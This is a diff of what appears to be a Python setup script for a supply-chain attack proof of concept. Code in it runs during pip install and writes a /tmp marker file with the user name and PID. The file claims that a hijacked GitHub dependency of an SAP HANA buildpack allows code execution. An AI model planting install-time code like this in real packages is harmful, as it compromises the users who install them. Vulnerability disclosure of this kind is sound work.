@@ -3,22 +3,21 @@ import os
 import sys
 
 # Create proof file
-poc_file = f"/tmp/SUPPLY_CHAIN_POC_{os.getpid()}.txt"
-with open(poc_file, "w") as f:
-    f.write("="*60 + "\n")
-    f.write("SUPPLY CHAIN ATTACK POC BY TALHAKHAN\n")
-    f.write("="*60 + "\n")
-    f.write(f"PROOF: Code executed during pip install\n")
-    f.write(f"User: {os.getenv('USER')}\n")
-    f.write(f"PID: {os.getpid()}\n")
-    f.write(f"Source: git+https://github.com/TalhaKhan-404/test.git\n")
-    f.write("\n" + "-"*60 + "\n")
-    f.write("VULNERABILITY CONFIRMED:\n")
-    f.write("-"*60 + "\n")
-    f.write("pip install from GitHub = Arbitrary code execution\n")
-    f.write("\nSAP HANA Buildpack vulnerable:\n")
-    f.write("git+https://github.com/alundesap/python-jws.git/#egg=jws\n")
-    f.write("="*60 + "\n")
+    with open(poc_file, "w") as f:
+        f.write("╔══════════════════════════════════════════════════════╗\n")
+        f.write("║        SUPPLY CHAIN ATTACK POC BY TALHAKHAN          ║\n")
+        f.write("╚══════════════════════════════════════════════════════╝\n")
+        f.write(f"\n📁 Proof File: {poc_file}\n")
+        f.write(f"🔢 Process ID: {pid}\n")
+        f.write(f"👤 User: {os.getenv('USER')}\n")
+        f.write("🔗 Source: pip install git+https://github.com/...\n")
+        f.write("\n" + "─"*55 + "\n")
+        f.write("🚨 VULNERABILITY CONFIRMED 🚨\n")
+        f.write("─"*55 + "\n")
+        f.write("• pip install from GitHub URL\n")
+        f.write("• Repository Takeover → RCE\n")
+        f.write("• Affects CI / Vendors / SAP HANA\n")
+        f.write("─"*55 + "\n")
 
 # Try to show output
 try:
